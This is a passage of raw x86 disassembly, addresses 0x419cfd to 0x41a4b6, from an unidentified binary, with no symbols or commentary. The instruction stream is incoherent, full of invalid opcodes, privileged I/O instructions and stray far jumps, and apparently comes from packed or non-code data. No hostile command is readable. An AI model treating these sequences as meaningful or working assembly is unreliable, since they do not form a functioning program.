  419cfd:	lds    esp,FWORD PTR [esi+0x5f]
  419d00:	shl    DWORD PTR [ecx-0x4b28d163],1
  419d06:	test   eax,0xaefe892d
  419d0b:	adc    ch,BYTE PTR [edi+0x7f871224]
  419d11:	stos   BYTE PTR es:[edi],al
  419d12:	and    DWORD PTR [esi],esp
  419d14:	aam    0x8
  419d16:	and    al,0xf8
  419d18:	adc    cl,bh
  419d1a:	rcr    DWORD PTR [edi-0x19],1
  419d1d:	sub    ebp,DWORD PTR [eax]
  419d1f:	and    al,0xe1
  419d21:	ins    BYTE PTR es:[edi],dx
  419d22:	(bad)  
  419d24:	loop   0x419d8e
  419d26:	pop    ebp
  419d27:	(bad)  
  419d28:	stos   DWORD PTR es:[edi],eax
  419d29:	shl    BYTE PTR [esi-0x16a9016e],0x63
  419d30:	jmp    0xf3d31177
  419d35:	bound  ebp,QWORD PTR [esi]
  419d37:	pop    ecx
  419d38:	pop    esp
  419d39:	jae    0x419cf1
  419d3b:	mov    bh,0x4c
  419d3d:	jnp    0x419d68
  419d3f:	sub    eax,0x8b4e7c5d
  419d44:	loop   0x419d46
  419d46:	jmp    0x419d8c
  419d48:	test   DWORD PTR [esi-0x42901f92],edi
  419d4e:	inc    eax
  419d4f:	or     DWORD PTR [edx],0x3e88f07c
  419d55:	sub    eax,0x869552e8
  419d5a:	push   ebx
  419d5b:	popa   
  419d5c:	jns    0x419d94
  419d5e:	ret    
  419d5f:	out    0xd1,eax
  419d61:	dec    esp
  419d62:	inc    eax
  419d63:	fisttp WORD PTR [esi+ebx*4-0x771c6e3a]
  419d6a:	add    al,0xc5
  419d6c:	push   ebx
  419d6d:	mov    cl,0x6c
  419d6f:	dec    ecx
  419d70:	ja     0x419d6a
  419d72:	(bad)  
  419d73:	mov    esp,esp
  419d75:	push   ss
  419d76:	mov    dl,0xc1
  419d78:	test   BYTE PTR [edx+0x58013d40],bh
  419d7e:	inc    ecx
  419d7f:	add    al,0x72
  419d81:	call   0x4255:0x8a3964a
  419d88:	push   ss
  419d89:	push   esp
  419d8a:	ds mov dh,0x59
  419d8d:	repnz xchg ebx,eax
  419d8f:	lock lods al,BYTE PTR ds:[esi]
  419d91:	push   edi
  419d92:	adc    eax,0xf5fa20ce
  419d97:	sbb    ch,BYTE PTR [ebp-0x75]
  419d9a:	sbb    bl,BYTE PTR [ebx-0x2e]
  419d9d:	lahf   
  419d9e:	jl     0x419daf
  419da0:	xor    DWORD PTR [ebx+ecx*1-0x2b],edx
  419da4:	out    dx,eax
  419da5:	push   ecx
  419da6:	clc    
  419da7:	cmc    
  419da8:	icebp  
  419da9:	mov    BYTE PTR ds:0xbd65f62d,dl
  419daf:	mov    edx,0x38ad14b1
  419db4:	add    eax,0xa86cde5a
  419db9:	arpl   di,bp
  419dbb:	mov    esp,0xc7015235
  419dc0:	push   0xffffffdb
  419dc2:	push   eax
  419dc3:	lea    edi,[eax-0x4d]
  419dc6:	cs mov ?,ebx
  419dc9:	stos   DWORD PTR es:[edi],eax
  419dca:	add    eax,0x1471ead8
  419dcf:	lods   eax,DWORD PTR ds:[esi]
  419dd0:	fst    st(1)
  419dd2:	and    eax,0x693a0ac9
  419dd7:	popf   
  419dd8:	xchg   esi,eax
  419dd9:	add    ch,BYTE PTR [ebx]
  419ddb:	xor    al,0x8
  419ddd:	(bad)  
  419dde:	mov    edi,0xaae56171
  419de3:	ret    0x323b
  419de6:	xor    al,0xef
  419de8:	lea    eax,[edi-0x49300569]
  419dee:	(bad)  
  419def:	cld    
  419df0:	ficomp WORD PTR [ebp+0x3a]
  419df3:	mov    esi,0xd4d149ca
  419df8:	loop   0x419dd2
  419dfa:	or     al,0x9e
  419dfc:	in     al,0x77
  419dfe:	cmp    bl,BYTE PTR [esi-0x44f4d851]
  419e04:	sub    BYTE PTR es:[ebp+ecx*2-0x59],ch
  419e09:	xor    DWORD PTR [eax+0x28],edi
  419e0c:	in     al,dx
  419e0d:	jo     0x419e89
  419e0f:	push   0xdd29f4be
  419e14:	sti    
  419e15:	fidiv  DWORD PTR [ebx+esi*2-0x34]
  419e19:	dec    edx
  419e1a:	in     al,dx
  419e1b:	dec    edi
  419e1c:	xor    cl,bl
  419e1e:	pop    esi
  419e1f:	iret   
  419e20:	es inc ecx
  419e22:	adc    bh,BYTE PTR [esi]
  419e24:	xchg   ch,ah
  419e26:	push   ebx
  419e27:	loope  0x419e1e
  419e29:	pop    esi
  419e2a:	push   ss
  419e2b:	xchg   esp,eax
  419e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e2d:	push   es
  419e2e:	cmp    ch,BYTE PTR [edi+ecx*8+0x2599a726]
  419e35:	aam    0x8b
  419e37:	sbb    ebx,DWORD PTR [edi-0x2846da4b]
  419e3d:	mov    ecx,0x76ffb89d
  419e42:	sub    eax,0x5284f9cf
  419e47:	scas   eax,DWORD PTR es:[edi]
  419e48:	and    eax,0x46af8fae
  419e4d:	fiadd  DWORD PTR [eax+0x6fe0acb4]
  419e53:	or     DWORD PTR [eax-0x62],edx
  419e56:	mov    dh,0x4e
  419e58:	(bad)  
  419e5a:	in     eax,0xed
  419e5c:	sbb    al,0x58
  419e5e:	mov    eax,ds:0xd4d83371
  419e63:	ror    BYTE PTR [edx-0x2f],1
  419e66:	mov    ebp,edi
  419e68:	enter  0x3a60,0x20
  419e6c:	jp     0x419edf
  419e6e:	cmp    DWORD PTR [eax-0x2d797e76],esp
  419e74:	and    DWORD PTR [esi],ebx
  419e76:	jno    0x419ec6
  419e78:	sub    dh,BYTE PTR [edx+0x4e]
  419e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e7c:	les    edx,FWORD PTR [eax-0x4f]
  419e7f:	iret   
  419e80:	or     ebx,DWORD PTR [esi-0x5b0937c9]
  419e86:	cli    
  419e87:	mov    bh,0xdc
  419e89:	sbb    cl,dh
  419e8b:	(bad)  
  419e8c:	rcr    al,1
  419e8e:	adc    ah,BYTE PTR [ecx-0x44e268b5]
  419e94:	daa    
  419e95:	int    0x30
  419e97:	mov    dh,0xd6
  419e99:	mov    ecx,0x4b3d063e
  419e9e:	push   es
  419e9f:	pop    esp
  419ea0:	mov    ah,0x53
  419ea2:	pop    ebp
  419ea3:	add    al,0xc2
  419ea5:	ins    DWORD PTR es:[edi],dx
  419ea6:	cli    
  419ea7:	mov    edi,DWORD PTR [ecx+esi*4]
  419eaa:	cdq    
  419eab:	adc    ecx,eax
  419ead:	mov    bl,0x73
  419eaf:	fidiv  WORD PTR [ecx-0x32dfd019]
  419eb5:	mov    al,0x2
  419eb7:	add    BYTE PTR [eax-0x46],dl
  419eba:	sbb    al,bl
  419ebc:	sub    BYTE PTR ss:[ebx+0x6b],al
  419ec0:	lds    esp,FWORD PTR [ebx+eax*2+0x6d]
  419ec4:	mov    ecx,0x1469fd4b
  419ec9:	xor    BYTE PTR [ecx-0x3c],0xc3
  419ecd:	adc    DWORD PTR [ecx+ebx*4],ebx
  419ed0:	aam    0x5b
  419ed2:	jmp    0x30533f71
  419ed7:	pop    ecx
  419ed8:	push   ds
  419ed9:	scas   eax,DWORD PTR es:[edi]
  419eda:	clc    
  419edb:	inc    edi
  419edc:	pop    es
  419edd:	cmp    al,0x49
  419edf:	sahf   
  419ee0:	adc    ebx,DWORD PTR gs:[eax+0x209bab1f]
  419ee7:	inc    edi
  419ee8:	push   0xffffff9d
  419eea:	inc    esi
  419eeb:	imul   eax,DWORD PTR [esi+ecx*2],0xffffff99
  419eef:	div    BYTE PTR [esi+0x64]
  419ef2:	mov    BYTE PTR [esi],al
  419ef4:	and    DWORD PTR [esi+0x48],eax
  419ef7:	sbb    DWORD PTR cs:[ecx],ebx
  419efa:	jmp    DWORD PTR [ecx+0x45b571fd]
  419f00:	aas    
  419f01:	push   cs
  419f02:	xchg   ecx,eax
  419f03:	call   DWORD PTR [ebx-0x22]
  419f06:	cs arpl di,bp
  419f09:	cli    
  419f0a:	jmp    0x2a1af40e
  419f0f:	ret    0x6712
  419f12:	pop    ds
  419f13:	pop    es
  419f14:	cmp    ebp,DWORD PTR [eax-0x71]
  419f17:	inc    edi
  419f18:	add    BYTE PTR [esi-0x6f],al
  419f1b:	scas   al,BYTE PTR es:[edi]
  419f1c:	xor    eax,0xc03f6d19
  419f21:	scas   al,BYTE PTR es:[edi]
  419f22:	adc    DWORD PTR [eax-0x7e8e5303],ebx
  419f28:	or     BYTE PTR [eax],0xa2
  419f2b:	xchg   ebx,eax
  419f2c:	sar    ebp,1
  419f2e:	jne    0x419f42
  419f30:	es ins BYTE PTR es:[edi],dx
  419f32:	or     eax,0xcd6e702a
  419f37:	jnp    0x419ee5
  419f39:	xor    ecx,esp
  419f3b:	sbb    BYTE PTR [edx-0x4b],bh
  419f3e:	sub    BYTE PTR [eax+0x3b],al
  419f41:	hlt    
  419f42:	adc    cl,bh
  419f44:	shl    BYTE PTR [edi-0x21c605a9],0x78
  419f4b:	jmp    0xe4e319a3
  419f50:	dec    edx
  419f51:	mov    BYTE PTR [edi-0x57],dh
  419f54:	fcom   DWORD PTR [edx-0x2d]
  419f57:	out    0x8a,al
  419f59:	xchg   ebp,eax
  419f5a:	cdq    
  419f5b:	ins    DWORD PTR es:[edi],dx
  419f5c:	push   ebx
  419f5d:	mov    di,0x63ef
  419f61:	(bad)  
  419f62:	pop    ecx
  419f63:	sbb    DWORD PTR [ebp-0x54160ad],0x708ad956
  419f6d:	adc    al,0xce
  419f6f:	mov    al,0xe6
  419f71:	push   esp
  419f72:	jb     0x419fc3
  419f74:	xor    bh,BYTE PTR [esp+ecx*4]
  419f77:	pop    ss
  419f78:	in     al,dx
  419f79:	jo     0x419f0c
  419f7b:	add    BYTE PTR [ebx],bl
  419f7d:	mov    edx,0xae175e20
  419f82:	lods   eax,DWORD PTR ds:[esi]
  419f83:	lock cmp al,0x89
  419f86:	data16 int 0x47
  419f89:	sbb    BYTE PTR [ecx+0x5d8b7375],dh
  419f8f:	or     BYTE PTR [ebp-0x237818bc],dl
  419f95:	xor    ebp,DWORD PTR [edi-0x79]
  419f98:	push   0x2ad22bf7
  419f9d:	fstp   TBYTE PTR [ebx-0xc]
  419fa0:	jle    0x419f86
  419fa2:	hlt    
  419fa3:	cli    
  419fa4:	adc    esp,DWORD PTR [edx-0x23]
  419fa7:	(bad)  
  419fa9:	jo     0x419fc9
  419fab:	adc    DWORD PTR [esi-0x1fe9bce5],eax
  419fb1:	adc    DWORD PTR [ebx],esp
  419fb3:	aaa    
  419fb4:	dec    edx
  419fb5:	ret    0xf8ee
  419fb8:	fld    TBYTE PTR [edx]
  419fba:	sub    al,0x5d
  419fbc:	scas   eax,DWORD PTR es:[edi]
  419fbd:	popa   
  419fbe:	jl     0x419f73
  419fc0:	pop    ds
  419fc1:	or     al,0x98
  419fc3:	aaa    
  419fc4:	mov    bl,BYTE PTR [edx]
  419fc6:	and    al,0xf0
  419fc8:	or     al,0x4d
  419fca:	add    esp,DWORD PTR [edi+0x1ad54571]
  419fd0:	mov    ah,0xf8
  419fd2:	mov    bh,0xa0
  419fd4:	mov    esi,0x873ecac5
  419fd9:	ja     0x419f63
  419fdb:	add    DWORD PTR [eiz*8-0x371a3e8b],0xffffffb2
  419fe3:	cs xor al,0x69
  419fe6:	xchg   esi,ebx
  419fe8:	aam    0xc1
  419fea:	mov    eax,0xbd6c6df1
  419fef:	sub    eax,0xd0028401
  419ff4:	rol    ebx,0x83
  419ff7:	xchg   ebp,eax
  419ff8:	enter  0x3636,0xbd
  419ffc:	push   ds
  419ffd:	mov    WORD PTR [ecx],gs
  419fff:	adc    ah,bh
  41a001:	jl     0x419f9e
  41a003:	mov    ?,WORD PTR [edx+edx*8+0x5d]
  41a007:	cmovnp esi,edx
  41a00a:	jmp    0x8fd1:0x9309f755
  41a011:	(bad)  
  41a012:	push   ecx
  41a013:	mov    bh,0xd8
  41a015:	ss jb  0x41a071
  41a018:	adc    eax,0xa922565e
  41a01d:	pop    edx
  41a01e:	fidiv  WORD PTR [edx]
  41a020:	pop    edx
  41a021:	mov    edi,0x5de1cb7a
  41a026:	xchg   DWORD PTR [edi+0x36],esp
  41a029:	ins    DWORD PTR es:[edi],dx
  41a02a:	mov    esp,0xbae29af5
  41a02f:	ins    DWORD PTR es:[edi],dx
  41a030:	xor    eax,0xe61c8039
  41a035:	dec    ebp
  41a036:	arpl   WORD PTR ds:0x654f0a14,si
  41a03c:	xchg   DWORD PTR [ecx-0x2b],edx
  41a03f:	stc    
  41a040:	jae    0x41a018
  41a042:	mov    ebx,0x7c63f2e3
  41a047:	js     0x41a090
  41a049:	retf   
  41a04a:	jle    0x41a03f
  41a04c:	stc    
  41a04d:	and    ch,BYTE PTR [esi-0x4b]
  41a050:	retf   
  41a051:	jmp    0x41a0d2
  41a053:	push   ecx
  41a054:	jno    0x41a018
  41a056:	adc    DWORD PTR [eax+0x6ca51d41],esp
  41a05c:	push   es
  41a05d:	pop    ecx
  41a05e:	jmp    0x6a42:0xf0c8683b
  41a065:	push   0x63
  41a067:	xor    bh,ch
  41a069:	xchg   ebx,eax
  41a06a:	mov    esi,0x98593886
  41a06f:	in     al,dx
  41a070:	repz loopne 0x41a056
  41a073:	(bad)  
  41a074:	std    
  41a075:	scas   eax,DWORD PTR es:[edi]
  41a076:	jge    0x41a0ed
  41a078:	bound  ecx,QWORD PTR [edi-0x2a53f5aa]
  41a07e:	call   0xac99:0x8d6e327b
  41a085:	or     DWORD PTR [ebx],0x5934268a
  41a08b:	arpl   WORD PTR [edx+0x5979df8c],si
  41a091:	sbb    al,0xdb
  41a093:	push   0x4df37a82
  41a098:	or     ecx,DWORD PTR [ebx-0x54]
  41a09b:	ror    BYTE PTR [edi+0x4f3370a7],1
  41a0a1:	lods   al,BYTE PTR ds:[esi]
  41a0a2:	xchg   esi,eax
  41a0a3:	cli    
  41a0a4:	push   ebp
  41a0a5:	aam    0x5e
  41a0a7:	cmp    eax,DWORD PTR [edi]
  41a0a9:	test   BYTE PTR [eax-0x33],dl
  41a0ac:	pushf  
  41a0ad:	jle    0x41a06c
  41a0af:	(bad)  
  41a0b0:	fwait
  41a0b1:	pop    esp
  41a0b2:	das    
  41a0b3:	jne    0x41a067
  41a0b5:	xchg   eax,ebp
  41a0b7:	(bad)  [ebp-0x18]
  41a0ba:	mov    ds:0xfd0af742,eax
  41a0bf:	dec    edx
  41a0c0:	(bad)  
  41a0c1:	mov    ebp,0x9cded78f
  41a0c6:	adc    DWORD PTR [edi-0x49],eax
  41a0c9:	adc    DWORD PTR [ebp-0x6e],ecx
  41a0cc:	sti    
  41a0cd:	sub    ebx,DWORD PTR [edi-0x6d]
  41a0d0:	mov    WORD PTR gs:[edi-0x2913e83a],?
  41a0d7:	ds jo  0x41a09f
  41a0da:	ffreep st(6)
  41a0dc:	(bad)  
  41a0dd:	dec    edi
  41a0de:	push   esp
  41a0df:	(bad)  
  41a0e1:	mov    eax,ds:0xaf3c289d
  41a0e6:	xor    bh,BYTE PTR [edx+ebx*1+0x592f50a4]
  41a0ed:	mov    BYTE PTR [edi+0x18],ah
  41a0f0:	test   eax,0x3d6e1bc7
  41a0f5:	jo     0x41a158
  41a0f7:	sub    al,0x5e
  41a0f9:	(bad)  
  41a0fb:	std    
  41a0fc:	push   ebx
  41a0fd:	stos   BYTE PTR es:[edi],al
  41a0fe:	fs out dx,eax
  41a100:	pop    esi
  41a101:	test   al,0x37
  41a103:	xor    BYTE PTR [eax],cl
  41a105:	jns    0x41a14c
  41a107:	jg     0x41a0fe
  41a109:	xor    eax,esi
  41a10b:	iret   
  41a10c:	ds js  0x41a11e
  41a10f:	and    eax,0x66654fd0
  41a114:	sub    eax,DWORD PTR [esi-0x3c]
  41a117:	mov    DWORD PTR [edx],ebp
  41a119:	(bad)  [eax+edx*1+0x3b]
  41a11d:	cs or  al,0x8f
  41a120:	jb     0x41a0e3
  41a122:	xchg   edi,eax
  41a123:	clc    
  41a124:	dec    esp
  41a125:	sub    al,0xa3
  41a127:	fisubr WORD PTR [eax-0x21]
  41a12a:	outs   dx,DWORD PTR ds:[esi]
  41a12b:	pop    esp
  41a12c:	and    eax,0x7490cc5d
  41a131:	stos   BYTE PTR es:[edi],al
  41a132:	adc    al,0x1a
  41a134:	fs sbb al,0x62
  41a137:	adc    ah,BYTE PTR ds:0x17da8abe
  41a13d:	jl     0x41a12f
  41a13f:	add    al,0xb
  41a141:	jae    0x41a149
  41a143:	in     eax,dx
  41a144:	mov    ds:0xfc4992d5,eax
  41a149:	cld    
  41a14a:	pop    es
  41a14b:	daa    
  41a14c:	pop    edi
  41a14d:	jne    0x41a187
  41a14f:	and    edx,DWORD PTR [edx-0x5d399c68]
  41a155:	fidiv  DWORD PTR [eax+0x53]
  41a158:	ins    DWORD PTR es:[edi],dx
  41a159:	outs   dx,DWORD PTR ds:[esi]
  41a15a:	cmp    al,0xb3
  41a15c:	aad    0xa9
  41a15e:	mov    ds:0x51abea0d,al
  41a163:	cmc    
  41a164:	neg    BYTE PTR [eax+0x25213523]
  41a16a:	jmp    0xdc3:0xc84bf44f
  41a171:	fisttp WORD PTR [edx]
  41a173:	cld    
  41a174:	cmp    al,0xef
  41a176:	push   0xb53f2cd8
  41a17b:	jns    0x41a15a
  41a17d:	and    al,0x63
  41a17f:	fild   WORD PTR [eax+0x3fda6049]
  41a185:	fistp  DWORD PTR [esi]
  41a187:	and    dl,ah
  41a189:	data16 (bad) 
  41a18c:	iret   
  41a18d:	mov    al,ds:0x35cd0ced
  41a192:	xor    al,0x22
  41a194:	sbb    BYTE PTR ds:0x7224ecb9,ch
  41a19a:	and    esi,ecx
  41a19c:	adc    al,0x42
  41a19e:	dec    edx
  41a19f:	test   esi,esi
  41a1a1:	inc    eax
  41a1a2:	test   eax,0x23d73041
  41a1a7:	ja     0x41a218
  41a1a9:	(bad)  
  41a1ab:	or     eax,0x79a07f29
  41a1b0:	sub    al,0xaa
  41a1b2:	mov    edx,ebx
  41a1b4:	mov    esp,0x9e43f596
  41a1b9:	sti    
  41a1ba:	mov    esp,0xe071579a
  41a1bf:	into   
  41a1c0:	ins    BYTE PTR es:[edi],dx
  41a1c1:	repz and eax,0x3e1a591a
  41a1c7:	sub    esi,DWORD PTR [ecx-0x69359e61]
  41a1cd:	lea    esi,[ecx-0x59]
  41a1d0:	adc    bl,bl
  41a1d2:	push   ebx
  41a1d3:	mov    edi,0x45b957db
  41a1d8:	sbb    cl,dh
  41a1da:	test   al,0x44
  41a1dc:	sbb    dl,bh
  41a1de:	outs   dx,BYTE PTR ds:[esi]
  41a1df:	stos   DWORD PTR es:[edi],eax
  41a1e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1e1:	xchg   edx,eax
  41a1e2:	fwait
  41a1e3:	mov    ebp,0x328a1f75
  41a1e8:	shr    BYTE PTR [ebp+0x30],1
  41a1eb:	lds    edx,FWORD PTR [eax-0x5b4545c2]
  41a1f1:	ss out 0x5d,eax
  41a1f4:	xchg   ch,bh
  41a1f6:	xor    al,dl
  41a1f8:	pop    esp
  41a1f9:	xlat   BYTE PTR ds:[ebx]
  41a1fa:	jl     0x41a193
  41a1fc:	add    eax,0x44b0b04b
  41a201:	ja     0x41a19c
  41a203:	fiadd  DWORD PTR [esi-0x7f]
  41a206:	pop    edx
  41a207:	daa    
  41a208:	pop    ecx
  41a209:	cmp    DWORD PTR [eax],esp
  41a20b:	cs sub esi,ebp
  41a20e:	iret   
  41a20f:	clc    
  41a210:	cmp    edi,ecx
  41a212:	pop    edi
  41a213:	jp     0x41a1d5
  41a215:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41a217:	iret   
  41a218:	mov    ebx,0xa5837b90
  41a21d:	xchg   esi,eax
  41a21e:	cmp    cl,BYTE PTR [edi-0x11d21fb1]
  41a224:	enter  0xc3cc,0x1b
  41a228:	sub    al,0x7b
  41a22a:	aam    0x33
  41a22c:	not    BYTE PTR [esi+0x2e]
  41a22f:	lods   al,BYTE PTR ds:[esi]
  41a230:	dec    esp
  41a231:	mov    gs,eax
  41a233:	mov    cl,0xed
  41a235:	ret    0xcdef
  41a238:	arpl   ax,di
  41a23a:	into   
  41a23b:	mov    eax,ds:0x5a828246
  41a240:	jecxz  0x41a2ae
  41a242:	push   cs
  41a243:	out    0x35,al
  41a245:	jo     0x41a20c
  41a247:	jp     0x41a280
  41a249:	or     DWORD PTR [edi+0x703f1381],ebx
  41a24f:	mov    ebp,edi
  41a251:	nop
  41a252:	jl     0x41a230
  41a254:	cs sbb edi,DWORD PTR cs:[edi-0x2ec77492]
  41a25c:	mov    dl,0xb3
  41a25e:	imul   eax,DWORD PTR cs:[edi],0xa55fb052
  41a265:	mov    edx,DWORD PTR [ebp+0x37ddc827]
  41a26b:	test   al,0xd8
  41a26d:	push   0x1de3e5e3
  41a272:	mov    ds:0xcd827525,eax
  41a277:	push   cs
  41a278:	mov    edx,0xfaecc10a
  41a27d:	icebp  
  41a27e:	(bad)  
  41a280:	xor    DWORD PTR [eax+ebp*2+0x77001be7],eax
  41a287:	mov    esi,0x4eb3e37d
  41a28c:	and    BYTE PTR [esi+0x71],bh
  41a28f:	jecxz  0x41a2ee
  41a291:	mov    edi,0x8166011e
  41a297:	pop    ss
  41a298:	mov    ch,0x20
  41a29a:	inc    ebp
  41a29b:	mov    WORD PTR [ebx],ss
  41a29d:	dec    ecx
  41a29e:	dec    BYTE PTR [esi-0x4cf21687]
  41a2a4:	je     0x41a28c
  41a2a6:	xlat   BYTE PTR ds:[ebx]
  41a2a7:	mov    ebp,0xee22f853
  41a2ac:	gs inc eax
  41a2ae:	arpl   dx,sp
  41a2b0:	cdq    
  41a2b1:	ins    DWORD PTR es:[edi],dx
  41a2b2:	add    edx,DWORD PTR [eax-0x65]
  41a2b5:	rol    bh,1
  41a2b7:	cmp    BYTE PTR [ecx],cl
  41a2b9:	jns    0x41a26c
  41a2bb:	stc    
  41a2bc:	in     eax,dx
  41a2bd:	mov    edi,0xf2430f7c
  41a2c2:	loope  0x41a310
  41a2c4:	vunpcklps ymm3,ymm4,YMMWORD PTR [esp+eax*4+0x501af071]
  41a2cd:	push   esi
  41a2ce:	shl    BYTE PTR [ebx-0x2e6f3398],1
  41a2d4:	je     0x41a2f5
  41a2d6:	inc    esi
  41a2d7:	pop    edi
  41a2d8:	stc    
  41a2d9:	xor    BYTE PTR [eax+0x4d],0x29
  41a2dd:	and    dl,BYTE PTR [esi-0x3bd8d08a]
  41a2e3:	jns    0x41a32b
  41a2e5:	retf   0x13f7
  41a2e8:	push   0xffffff96
  41a2ea:	arpl   WORD PTR [edx+edi*8],bx
  41a2ed:	dec    ecx
  41a2ee:	int    0x9b
  41a2f0:	inc    DWORD PTR [ecx]
  41a2f2:	je     0x41a299
  41a2f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2f5:	xlat   BYTE PTR ds:[ebx]
  41a2f6:	aam    0x3e
  41a2f8:	cmp    BYTE PTR [eax+0x77ef3508],ah
  41a2fe:	fdivr  st(0),st
  41a300:	and    DWORD PTR [esi],ebx
  41a302:	pop    esi
  41a303:	es out dx,eax
  41a305:	adc    BYTE PTR [eax],dh
  41a307:	mov    eax,ds:0x64448d89
  41a30c:	mov    al,0xf1
  41a30e:	fld    QWORD PTR [ebp+0x30]
  41a311:	add    al,0x1e
  41a313:	xor    ah,BYTE PTR [ecx+ebp*8-0x6d]
  41a317:	in     eax,dx
  41a318:	pop    esp
  41a319:	arpl   WORD PTR [edi+0x3ad6163],di
  41a31f:	dec    edx
  41a320:	mov    edi,DWORD PTR [ebp-0x68eb5ec9]
  41a326:	mov    esi,0x3429cc1d
  41a32b:	xchg   ecx,eax
  41a32c:	scas   al,BYTE PTR es:[edi]
  41a32d:	popa   
  41a32e:	and    al,0x54
  41a330:	push   ebp
  41a331:	inc    ebx
  41a332:	ja     0x41a33c
  41a334:	cmp    BYTE PTR [esi-0x24],ah
  41a337:	(bad)  
  41a338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a339:	arpl   WORD PTR [ebx-0x3b],bp
  41a33c:	mov    ebp,0x64ca00ad
  41a341:	mov    DWORD PTR [ebp+0x7c],0xc688e55d
  41a348:	or     al,0x99
  41a34a:	sbb    al,0x82
  41a34c:	dec    ebx
  41a34d:	pop    ds
  41a34e:	mov    al,0x5b
  41a350:	loope  0x41a344
  41a352:	inc    eax
  41a353:	jg     0x41a305
  41a355:	sbb    eax,0xe1a06655
  41a35a:	pusha  
  41a35b:	xchg   ch,ah
  41a35d:	imul   esp,DWORD PTR [eax-0x1f],0x897141e7
  41a364:	repnz pop ebp
  41a366:	shl    BYTE PTR [esi+0x768d63e2],0x67
  41a36d:	cmp    cl,cl
  41a36f:	xchg   esi,eax
  41a370:	std    
  41a371:	popf   
  41a372:	push   esi
  41a373:	ja     0x41a3f2
  41a375:	and    al,0x2e
  41a377:	fmul   QWORD PTR [ecx]
  41a379:	leave  
  41a37a:	mov    dl,0xe9
  41a37c:	sti    
  41a37d:	sti    
  41a37e:	mov    BYTE PTR [edx+0xf26c93d],dh
  41a384:	gs jo  0x41a3fe
  41a387:	xor    ah,BYTE PTR [edx-0x5d92ee83]
  41a38d:	scas   al,BYTE PTR es:[edi]
  41a38e:	lds    edx,FWORD PTR [edx+0xa]
  41a391:	sub    bh,BYTE PTR [eax]
  41a393:	push   edi
  41a394:	push   esp
  41a395:	or     DWORD PTR [ebp-0x68b0d166],edx
  41a39b:	mov    eax,0x6f215f1e
  41a3a0:	mov    DWORD PTR [esi],edi
  41a3a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3a3:	dec    eax
  41a3a4:	adc    eax,0xca4f0070
  41a3a9:	imul   ecx,DWORD PTR [edi-0x45],0xdb2586e4
  41a3b0:	cmp    ebp,ecx
  41a3b2:	retf   0x8c9a
  41a3b5:	aaa    
  41a3b6:	cld    
  41a3b7:	inc    eax
  41a3b8:	imul   BYTE PTR [esi]
  41a3ba:	repz xor esp,eax
  41a3bd:	or     bl,BYTE PTR [ecx+esi*4+0x67]
  41a3c1:	cmp    bl,BYTE PTR [eax]
  41a3c3:	dec    ebp
  41a3c4:	(bad)  
  41a3c5:	mov    al,ds:0x8b9e97dc
  41a3ca:	test   al,0x62
  41a3cc:	inc    ebx
  41a3cd:	ins    BYTE PTR es:[edi],dx
  41a3ce:	pusha  
  41a3cf:	inc    ebp
  41a3d0:	lea    eax,[ecx-0x3d87f267]
  41a3d6:	addr16 mov ah,0x1e
  41a3d9:	or     edx,DWORD PTR [ebx-0x53155de8]
  41a3df:	pop    ebx
  41a3e0:	xchg   ebx,eax
  41a3e1:	ss mov dh,0x41
  41a3e4:	lock out dx,eax
  41a3e6:	push   edx
  41a3e7:	test   DWORD PTR [esi-0x46],0xfedce92c
  41a3ee:	fdivr  DWORD PTR [edi]
  41a3f0:	out    0x14,eax
  41a3f2:	rol    ecx,1
  41a3f4:	jl     0x41a3ca
  41a3f6:	std    
  41a3f7:	dec    edi
  41a3f8:	or     edi,ebx
  41a3fa:	pop    ebx
  41a3fb:	jl     0x41a46a
  41a3fd:	dec    edi
  41a3fe:	push   eax
  41a3ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a400:	mov    ds:0xac389be6,al
  41a405:	fsubr  QWORD PTR [esi+0x1710072d]
  41a40b:	in     eax,dx
  41a40c:	xor    esi,DWORD PTR gs:[ebx+0x60c51902]
  41a413:	and    dl,al
  41a415:	adc    eax,0xe77f2baf
  41a41a:	xor    al,0x93
  41a41c:	int    0x1b
  41a41e:	enter  0x1e8d,0x3f
  41a422:	fidiv  DWORD PTR [edx-0x17]
  41a425:	shr    DWORD PTR [ecx-0x7a],0x4c
  41a429:	iret   
  41a42a:	pushf  
  41a42b:	in     eax,dx
  41a42c:	push   0x60
  41a42e:	adc    ch,BYTE PTR [ebx-0x34a0909d]
  41a434:	mov    ds:0x26a8bc77,al
  41a439:	inc    ebx
  41a43a:	jp     0x41a418
  41a43c:	and    al,0x26
  41a43e:	(bad)  
  41a43f:	mov    ah,0xa4
  41a441:	mov    esp,DWORD PTR [eax-0x938a059]
  41a447:	(bad)  
  41a448:	loop   0x41a445
  41a44a:	leave  
  41a44b:	ret    0xb35e
  41a44e:	mov    eax,ebx
  41a450:	ja     0x41a47e
  41a452:	mov    ch,0xc2
  41a454:	sub    ebp,0x17cdd352
  41a45a:	xchg   edi,eax
  41a45b:	lahf   
  41a45c:	xchg   edi,eax
  41a45d:	push   esi
  41a45e:	push   edi
  41a45f:	push   edx
  41a460:	mov    ah,0x51
  41a462:	jge    0x41a40f
  41a464:	jg     0x41a47c
  41a466:	mov    WORD PTR [ebx-0x2999f766],ss
  41a46c:	xor    eax,DWORD PTR [esi]
  41a46e:	addr16 push esp
  41a470:	and    eax,0x3f24ed41
  41a475:	lock sub ah,dh
  41a478:	out    dx,eax
  41a479:	mov    cl,0x99
  41a47b:	pushf  
  41a47c:	or     eax,0xed571d4b
  41a481:	inc    edx
  41a482:	sub    al,0x4c
  41a484:	mov    BYTE PTR ds:0x6432e85b,bl
  41a48a:	dec    ecx
  41a48b:	xor    al,0x43
  41a48d:	adc    BYTE PTR [ebp+edi*8-0x2d826abc],0x58
  41a495:	repz out 0xcd,eax
  41a498:	into   
  41a499:	add    eax,0xf2de4b6a
  41a49e:	fistp  DWORD PTR [edx+0x5e2eaf09]
  41a4a4:	not    BYTE PTR [ebp+0x28]
  41a4a7:	sub    DWORD PTR [ebp+ebx*1+0x544c6a2e],esi
  41a4ae:	dec    ecx
  41a4af:	pop    edi
  41a4b0:	or     DWORD PTR [edx],0x1a896e8
  41a4b6:	sar    BYTE PTR [esi+0x7d687096],0x3
